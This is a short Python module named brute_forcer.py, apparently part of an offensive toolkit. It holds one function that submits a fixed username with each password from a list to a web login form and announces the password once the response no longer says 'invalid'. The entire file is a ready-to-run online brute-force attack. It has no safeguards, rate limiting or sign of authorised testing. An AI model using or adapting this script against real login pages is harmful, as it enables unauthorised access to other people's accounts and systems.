# modules/brute_forcer.py
import requests

def brute_force_login(url, username_field, password_field, username, password_list):
    print(f"🔑 Starting brute-force on {url}")
    for password in password_list:
        data = {username_field: username, password_field: password.strip()}
        response = requests.post(url, data=data)
        if "invalid" not in response.text.lower():
            print(f"✅ Success! Password found: {password.strip()}")
            return
    print("❌ Brute-force failed. No valid password found.")

